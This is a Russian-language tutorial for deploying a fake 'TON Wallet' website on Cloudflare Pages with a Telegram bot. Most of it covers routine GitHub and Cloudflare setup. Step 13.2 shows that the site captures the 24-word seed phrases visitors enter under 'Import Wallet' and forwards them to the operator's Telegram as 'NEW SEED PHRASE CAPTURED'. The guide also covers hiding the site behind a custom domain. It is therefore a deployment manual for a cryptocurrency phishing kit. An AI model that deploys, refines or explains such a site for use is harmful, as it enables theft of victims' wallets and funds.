# 🚀 Cloudflare Pages: Пошаговая инструкция с картинками

## 📋 Что вам понадобится:

- ✅ Аккаунт на GitHub (бесплатно)
- ✅ Аккаунт на Cloudflare (бесплатно)
- ✅ Telegram Bot Token
- ✅ Telegram Chat ID
- ✅ 15 минут времени

---

# ЧАСТЬ 1: Подготовка проекта на GitHub

## Шаг 1: Создайте аккаунт на GitHub

1. **Откройте браузер и перейдите:** https://github.com
2. **Нажмите кнопку:** `Sign up` (в правом верхнем углу)
3. **Заполните форму:**
   - Email: ваш email
   - Password: придумайте пароль
   - Username: придумайте имя пользователя
4. **Подтвердите email** (придет письмо на почту)

---

## Шаг 2: Установите Git на ваш компьютер

### Для Windows:
1. Скачайте Git: https://git-scm.com/download/win
2. Запустите установщик
3. Нажимайте "Next" везде (настройки по умолчанию подходят)
4. Перезапустите терминал/командную строку

### Для macOS:
```bash
# Откройте Terminal и выполните:
brew install git

# Если нет Homebrew, сначала установите его:
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

### Для Linux (Ubuntu/Debian):
```bash
sudo apt update
sudo apt install git
```

**Проверьте установку:**
```bash
git --version
# Должно показать: git version 2.x.x
```

---

## Шаг 3: Настройте Git

```bash
# Откройте терминал/командную строку в папке вашего проекта
# (там где находится файл package.json)

# Настройте имя и email
git config --global user.name "Ваше Имя"
git config --global user.email "your-email@example.com"
```

---

## Шаг 4: Загрузите проект на GitHub

### 4.1. Создайте репозиторий на GitHub

1. **Откройте:** https://github.com
2. **Нажмите кнопку:** `+` (плюс) в правом верхнем углу
3. **Выберите:** `New repository`
4. **Заполните форму:**
   ```
   Repository name: ton-wallet
   Description: TON Wallet Manager
   
   ☑️ Public (публичный) или Private (приватный) - на ваш выбор
   ❌ НЕ ставьте галочки на:
      - Add a README file
      - Add .gitignore
      - Choose a license
   ```
5. **Нажмите:** зеленую кнопку `Create repository`

### 4.2. Загрузите код

GitHub покажет вам страницу с инструкциями. **Скопируйте URL репозитория** (он выглядит так: `https://github.com/ваш-username/ton-wallet.git`)

Теперь в **терминале**, в папке вашего проекта:

```bash
# 1. Инициализируйте Git
git init

# 2. Добавьте все файлы
git add .

# 3. Создайте первый коммит
git commit -m "Initial commit"

# 4. Переименуйте ветку в main (если нужно)
git branch -M main

# 5. Подключите удаленный репозиторий
# ЗАМЕНИТЕ URL на ваш собственный!
git remote add origin https://github.com/ваш-username/ton-wallet.git

# 6. Загрузите код на GitHub
git push -u origin main
```

**При первой загрузке GitHub может запросить авторизацию:**
- Введите ваш username
- Вместо пароля используйте Personal Access Token (см. ниже)

### 4.3. Создайте Personal Access Token (если нужно)

Если Git просит пароль:

1. Откройте: https://github.com/settings/tokens
2. Нажмите: `Generate new token` → `Generate new token (classic)`
3. Заполните:
   ```
   Note: Git Access
   Expiration: 90 days (или больше)
   Scopes: ☑️ repo (поставьте галочку)
   ```
4. Нажмите: `Generate token`
5. **СКОПИРУЙТЕ токен** (он показывается только один раз!)
6. Используйте этот токен вместо пароля при push

---

## Шаг 5: Проверьте что код загружен

1. Откройте ваш репозиторий: `https://github.com/ваш-username/ton-wallet`
2. Вы должны увидеть все файлы проекта
3. Убедитесь что файл `.env` **НЕ** загружен (это правильно!)

---

# ЧАСТЬ 2: Настройка Cloudflare Pages

## Шаг 6: Создайте аккаунт на Cloudflare

1. **Откройте:** https://dash.cloudflare.com/sign-up
2. **Заполните форму регистрации:**
   ```
   Email: ваш email
   Password: придумайте пароль
   ```
3. **Нажмите:** `Create Account`
4. **Подтвердите email** (придет письмо)

---

## Шаг 7: Создайте проект на Cloudflare Pages

### 7.1. Откройте панель управления

1. **После входа вы окажетесь на:** https://dash.cloudflare.com
2. **В левом меню найдите:** `Workers & Pages`
3. **Нажмите на:** `Workers & Pages`

```
┌─────────────────────────────────────┐
│ Cloudflare Dashboard                │
│                                     │
│  ☰ Меню слева:                     │
│  ├─ Home                            │
│  ├─ Analytics                       │
│  ├─ DNS                             │
│  ├─ Email                           │
│  ├─ SSL/TLS                         │
│  ├─ Speed                           │
│  ├─ Caching                         │
│  ├─ ► Workers & Pages  ← ЖМИ СЮДА │
│  ├─ ...                             │
└─────────────────────────────────────┘
```

### 7.2. Создайте новый проект

1. **На странице Workers & Pages нажмите:** синюю кнопку `Create application` (или `Create`)
   
2. **Выберите вкладку:** `Pages` (вверху)

```
┌─────────────────────────────────────┐
│  Workers    Pages  ← выберите тут   │
├─────────────────────────────────────┤
│                                     │
│  Create using...                    │
│                                     │
│  ┌──────────────┐  ┌──────────────┐│
│  │              │  │              ││
│  │  Connect     │  │  Direct      ││
│  │  to Git      │  │  Upload      ││
│  │              │  │              ││
│  │  ← ЖМИ СЮДА │  │              ││
│  └──────────────┘  └──────────────┘│
└─────────────────────────────────────┘
```

3. **Нажмите:** `Connect to Git`

---

## Шаг 8: Подключите GitHub

### 8.1. Авторизуйте GitHub

1. **Вы увидите кнопку:** `Connect GitHub`
2. **Нажмите на неё**
3. **Откроется окно GitHub** с запросом доступа
4. **Нажмите:** зеленую кнопку `Authorize Cloudflare`

```
┌─────────────────────────────────────┐
│  GitHub Authorization Request       │
├─────────────────────────────────────┤
│                                     │
│  Cloudflare Pages wants to:         │
│  ☑️ Access your repositories        │
│  ☑️ Read and write access           │
│                                     │
│  ┌─────────────────────────────┐   │
│  │  Authorize Cloudflare       │   │
│  │         Pages               │   │
│  └─────────────────────────────┘   │
└─────────────────────────────────────┘
```

### 8.2. Выберите репозиторий

После авторизации вас вернет на Cloudflare.

**Вариант 1: Дать доступ ко ВСЕМ репозиториям**
- Нажмите: `Install & Authorize`
- Все ваши репозитории будут доступны

**Вариант 2: Дать доступ только к одному репозиторию** (рекомендую)
1. Нажмите: `Only select repositories`
2. В выпадающем списке выберите: `ton-wallet` (или как вы назвали)
3. Нажмите: `Install & Authorize`

```
┌─────────────────────────────────────┐
│  Install Cloudflare Pages           │
├─────────────────────────────────────┤
│                                     │
│  Repository access:                 │
│  ◉ All repositories                 │
│  ◯ Only select repositories         │
│                                     │
│     Select repositories:            │
│     ┌─────────────────────────┐    │
│     │ ton-wallet         ▼    │    │
│     └─────────────────────────┘    │
│                                     │
│  ┌─────────────────────────────┐   │
│  │  Install & Authorize        │   │
│  └─────────────────────────────┘   │
└─────────────────────────────────────┘
```

---

## Шаг 9: Настройте проект

### 9.1. Выберите репозиторий

После авторизации вы вернетесь на Cloudflare. Теперь:

1. **Вы увидите список репозиториев**
2. **Найдите:** `ton-wallet` (или ваше название)
3. **Нажмите:** кнопку `Begin setup` рядом с ним

```
┌─────────────────────────────────────┐
│  Select a repository                │
├─────────────────────────────────────┤
│                                     │
│  🔍 Search repositories...          │
│                                     │
│  ┌─────────────────────────────┐   │
│  │ ваш-username/ton-wallet     │   │
│  │ Updated 5 minutes ago       │   │
│  │                             │   │
│  │      [Begin setup] ← ЖМИ    │   │
│  └─────────────────────────────┘   │
└─────────────────────────────────────┘
```

### 9.2. Настройте параметры сборки

Заполните форму **ТОЧНО ТАК:**

```
┌─────────────────────────────────────────────────┐
│  Set up builds and deployments                  │
├─────────────────────────────────────────────────┤
│                                                 │
│  Project name:                                  │
│  ┌─────────────────────────────────────────┐   │
│  │ ton-wallet                              │   │
│  └─────────────────────────────────────────┘   │
│  (Можно изменить, будет в URL)                 │
│                                                 │
│  Production branch:                             │
│  ┌─────────────────────────────────────────┐   │
│  │ main                                ▼   │   │
│  └─────────────────────────────────────────┘   │
│                                                 │
│  Framework preset:                              │
│  ┌─────────────────────────────────────────┐   │
│  │ Astro                               ▼   │   │
│  └─────────────────────────────────────────┘   │
│  ↑ ВАЖНО: выберите Astro!                      │
│                                                 │
│  Build command:                                 │
│  ┌─────────────────────────────────────────┐   │
│  │ npm run build                           │   │
│  └─────────────────────────────────────────┘   │
│                                                 │
│  Build output directory:                        │
│  ┌─────────────────────────────────────────┐   │
│  │ dist                                    │   │
│  └─────────────────────────────────────────┘   │
│                                                 │
│  Root directory:                                │
│  ┌─────────────────────────────────────────┐   │
│  │ /                                       │   │
│  └─────────────────────────────────────────┘   │
│  (Оставьте как есть)                           │
│                                                 │
└─────────────────────────────────────────────────┘
```

**⚠️ ВАЖНО - проверьте эти значения:**

| Поле | Значение |
|------|----------|
| Project name | `ton-wallet` (или любое) |
| Production branch | `main` |
| Framework preset | **Astro** ← обязательно! |
| Build command | `npm run build` |
| Build output directory | `dist` |
| Root directory | `/` (оставьте пустым или /) |

### 9.3. НЕ нажимайте "Save and Deploy" пока!

**Сначала добавим переменные окружения!**

---

## Шаг 10: Добавьте переменные окружения (Environment Variables)

### 10.1. Откройте секцию Environment Variables

**Прокрутите страницу вниз** до раздела:

```
┌─────────────────────────────────────┐
│  Environment variables (advanced) ▼ │  ← Раскройте этот раздел
└─────────────────────────────────────┘
```

Нажмите на него чтобы раскрыть.

### 10.2. Добавьте TELEGRAM_BOT_TOKEN

1. **Нажмите кнопку:** `Add variable`

```
┌─────────────────────────────────────────────────┐
│  Environment variables                          │
├─────────────────────────────────────────────────┤
│                                                 │
│  Variable name:                                 │
│  ┌─────────────────────────────────────────┐   │
│  │ TELEGRAM_BOT_TOKEN                      │   │
│  └─────────────────────────────────────────┘   │
│                                                 │
│  Value:                                         │
│  ┌─────────────────────────────────────────┐   │
│  │ 123456789:ABCdefGHIjklMNOpqrsTUVwxyz   │   │
│  └─────────────────────────────────────────┘   │
│  ↑ Вставьте ваш токен бота                     │
│                                                 │
│  Environment:                                   │
│  ☑️ Production                                  │
│  ☑️ Preview                                     │
│                                                 │
└─────────────────────────────────────────────────┘
```

**Значения:**
- **Variable name:** `TELEGRAM_BOT_TOKEN`
- **Value:** ваш токен от @BotFather (выглядит как `123456789:ABCdef...`)
- **Environment:** оставьте обе галочки (Production и Preview)

### 10.3. Добавьте TELEGRAM_CHAT_ID

2. **Нажмите:** `Add variable` ещё раз

```
┌─────────────────────────────────────────────────┐
│  Environment variables                          │
├─────────────────────────────────────────────────┤
│                                                 │
│  Variable name:                                 │
│  ┌─────────────────────────────────────────┐   │
│  │ TELEGRAM_CHAT_ID                        │   │
│  └─────────────────────────────────────────┘   │
│                                                 │
│  Value:                                         │
│  ┌─────────────────────────────────────────┐   │
│  │ 123456789                               │   │
│  └─────────────────────────────────────────┘   │
│  ↑ Вставьте ваш Chat ID                        │
│                                                 │
│  Environment:                                   │
│  ☑️ Production                                  │
│  ☑️ Preview                                     │
│                                                 │
└─────────────────────────────────────────────────┘
```

**Значения:**
- **Variable name:** `TELEGRAM_CHAT_ID`
- **Value:** ваш Chat ID (цифры, например `123456789`)
- **Environment:** оставьте обе галочки

### 10.4. Как получить эти значения?

#### 🤖 Получить TELEGRAM_BOT_TOKEN:

1. Откройте Telegram
2. Найдите бота: `@BotFather`
3. Отправьте команду: `/newbot`
4. Следуйте инструкциям:
   - Придумайте имя бота: `TON Wallet Logger`
   - Придумайте username: `ton_wallet_logger_bot` (должен заканчиваться на `_bot`)
5. **BotFather пришлет токен** - скопируйте его!
   ```
   Use this token to access the HTTP API:
   123456789:ABCdefGHIjklMNOpqrsTUVwxyz-123456
   ```

#### 💬 Получить TELEGRAM_CHAT_ID:

**Вариант 1: Ваш личный Chat ID**

1. Откройте бота: `@userinfobot`
2. Нажмите `/start`
3. Бот покажет ваш ID:
   ```
   Id: 123456789  ← это ваш Chat ID
   ```

**Вариант 2: ID группы**

1. Создайте группу в Telegram
2. Добавьте туда вашего бота (которого создали через @BotFather)
3. Добавьте бота `@getmyid_bot`
4. Бот покажет ID группы:
   ```
   This group's id: -987654321  ← это Chat ID группы
   ```

**⚠️ ВАЖНО:** ID группы начинается с минуса! Скопируйте с минусом!

---

## Шаг 11: Запустите деплой

1. **Проверьте всё ещё раз:**
   - ✅ Framework preset: Astro
   - ✅ Build command: npm run build
   - ✅ Build output: dist
   - ✅ TELEGRAM_BOT_TOKEN добавлен
   - ✅ TELEGRAM_CHAT_ID добавлен

2. **Нажмите большую синюю кнопку внизу:**
   ```
   ┌─────────────────────────────────┐
   │    Save and Deploy              │
   └─────────────────────────────────┘
   ```

---

## Шаг 12: Дождитесь завершения деплоя

### 12.1. Процесс сборки

После нажатия "Save and Deploy" откроется страница с логами:

```
┌─────────────────────────────────────────────────┐
│  Building ton-wallet                            │
├─────────────────────────────────────────────────┤
│                                                 │
│  ⏳ Initializing...                             │
│  ⏳ Cloning repository...                       │
│  ⏳ Installing dependencies...                  │
│  ⏳ Building application...                     │
│  ⏳ Deploying to Cloudflare network...          │
│                                                 │
│  [====================] 100%                    │
│                                                 │
└─────────────────────────────────────────────────┘
```

**Это займет 2-5 минут.** Можете попить чай ☕

### 12.2. Успех!

Когда всё готово, вы увидите:

```
┌─────────────────────────────────────────────────┐
│  ✅ Success! Your site is live!                 │
├─────────────────────────────────────────────────┤
│                                                 │
│  🌐 https://ton-wallet.pages.dev                │
│                                                 │
│  ┌──────────────┐  ┌──────────────┐            │
│  │ Visit site   │  │ View build   │            │
│  └──────────────┘  └──────────────┘            │
│                                                 │
└─────────────────────────────────────────────────┘
```

3. **Нажмите:** `Visit site` чтобы открыть ваш сайт!

---

## Шаг 13: Проверьте что всё работает

### 13.1. Откройте ваш сайт

URL будет выглядеть так: `https://ton-wallet.pages.dev`

Вы должны увидеть:
- ✅ Красивую страницу с TON логотипом
- ✅ Цену TON в правом верхнем углу
- ✅ Кнопки "Import Wallet" и "Create Wallet"

### 13.2. Проверьте отправку в Telegram

1. **Нажмите:** "Import Wallet"
2. **Введите любую тестовую фразу** (24 слова через пробел)
3. **Нажмите:** "Import Wallet"
4. **Откройте Telegram** и проверьте что сообщение пришло!

```
🔐 NEW SEED PHRASE CAPTURED

━━━━━━━━━━━━━━━━━━━━━━
🗓 Date: January 15, 2025
🕐 Time: 14:30:25 UTC

🔑 SEED PHRASE:
test test test ... (ваши 24 слова)
...
```

**Если сообщение пришло - ВСЁ РАБОТАЕТ!** 🎉

---

## Шаг 14: Настройте собственный домен (опционально)

### Если хотите использовать свой домен вместо `.pages.dev`:

1. **В панели Cloudflare Pages** откройте ваш проект
2. **Перейдите на вкладку:** `Custom domains`
3. **Нажмите:** `Set up a custom domain`
4. **Введите ваш домен:** например `wallet.example.com`
5. **Следуйте инструкциям** по настройке DNS

Cloudflare автоматически:
- ✅ Настроит SSL сертификат (HTTPS)
- ✅ Настроит DNS записи
- ✅ Всё будет работать через 2-5 минут

---

# 🎉 ГОТОВО! Ваш сайт онлайн!

## 📊 Что теперь доступно:

```
✅ Ваш сайт: https://ton-wallet.pages.dev
✅ Автоматические деплои при push в GitHub
✅ Бесплатный SSL (HTTPS)
✅ Глобальная CDN (быстро везде)
✅ Telegram уведомления работают
✅ 100% бесплатно
```

---

# 🔄 Как обновить сайт в будущем

Теперь когда всё настроено, обновлять сайт **очень просто**:

```bash
# 1. Внесите изменения в код
# 2. Откройте терминал в папке проекта
# 3. Выполните команды:

git add .
git commit -m "Описание изменений"
git push

# 4. Cloudflare автоматически пересоберет и задеплоит!
# Ждите 2-3 минуты и изменения будут онлайн
```

---

# 🆘 Решение проблем

## Проблема 1: "Build failed"

**Проверьте в логах сборки:**

```bash
# Если ошибка "Module not found"
# Решение: проверьте что package.json загружен на GitHub

# Если ошибка "Command failed"
# Решение: проверьте что Build command = "npm run build"
```

**Как посмотреть логи:**
1. Откройте ваш проект в Cloudflare Pages
2. Вкладка "Deployments"
3. Нажмите на последний деплой
4. Смотрите логи

## Проблема 2: "Telegram не отправляет сообщения"

**Чек-лист:**
- ✅ TELEGRAM_BOT_TOKEN правильный? (проверьте нет ли лишних пробелов)
- ✅ TELEGRAM_CHAT_ID правильный?
- ✅ Если используете группу - бот добавлен в группу?
- ✅ Если используете группу - ID начинается с минуса? `-123456789`

**Как проверить токен:**
1. Откройте в браузере:
   ```
   https://api.telegram.org/bot<ВАШ_ТОКЕН>/getMe
   ```
2. Должен ответить JSON с данными бота

**Как проверить Chat ID:**
1. Откройте в браузере:
   ```
   https://api.telegram.org/bot<ВАШ_ТОКЕН>/sendMessage?chat_id=<ВАШ_CHAT_ID>&text=test
   ```
2. Должно прийти сообщение "test"

## Проблема 3: "Страница показывает 404"

**Решение:**
1. Проверьте что Framework preset = **Astro**
2. Проверьте что Build output directory = **dist**
3. Пересоберите проект:
   - Settings → Builds & deployments
   - Retry deployment

## Проблема 4: "Не могу подключить GitHub"

**Решение:**
1. Откройте: https://github.com/settings/installations
2. Найдите "Cloudflare Pages"
3. Нажмите "Configure"
4. Дайте доступ к репозиторию
5. Вернитесь на Cloudflare и обновите страницу

## Проблема 5: "Git push не работает"

```bash
# Ошибка: "Permission denied"
# Решение: создайте Personal Access Token (см. Шаг 4.3)

# Ошибка: "Repository not found"
# Решение: проверьте URL репозитория
git remote -v

# Если URL неправильный:
git remote set-url origin https://github.com/правильный-username/ton-wallet.git
```

---

# 📞 Нужна дополнительная помощь?

## Полезные ссылки:

- 🌐 Cloudflare Docs: https://developers.cloudflare.com/pages
- 🐙 GitHub Docs: https://docs.github.com
- 📱 Telegram Bot API: https://core.telegram.org/bots/api
- 🚀 Astro Docs: https://docs.astro.build

## Что делать если ничего не помогает:

1. **Проверьте логи сборки** в Cloudflare Pages
2. **Проверьте переменные окружения** (нет лишних пробелов?)
3. **Попробуйте пересобрать** проект с нуля
4. **Проверьте что GitHub репозиторий содержит все файлы**

---

# 🎊 Поздравляю! Ваш сайт работает!

Теперь у вас есть:
- ✅ Полнофункциональный TON Wallet сайт
- ✅ Автоматический деплой
- ✅ Бесплатный хостинг
- ✅ Глобальная доступность
- ✅ Telegram интеграция

**Пользуйтесь и развивайте дальше!** 🚀

---

## 📝 Краткая шпаргалка команд

```bash
# Проверка статуса Git
git status

# Добавить все изменения
git add .

# Создать коммит
git commit -m "описание изменений"

# Отправить на GitHub (автоматически деплоится)
git push

# Посмотреть удаленные репозитории
git remote -v

# Посмотреть историю коммитов
git log --oneline

# Отменить изменения (осторожно!)
git reset --hard HEAD

# Создать новую ветку
git checkout -b feature/new-feature

# Переключиться на main
git checkout main
```

**Сохраните эту шпаргалку!** 📌
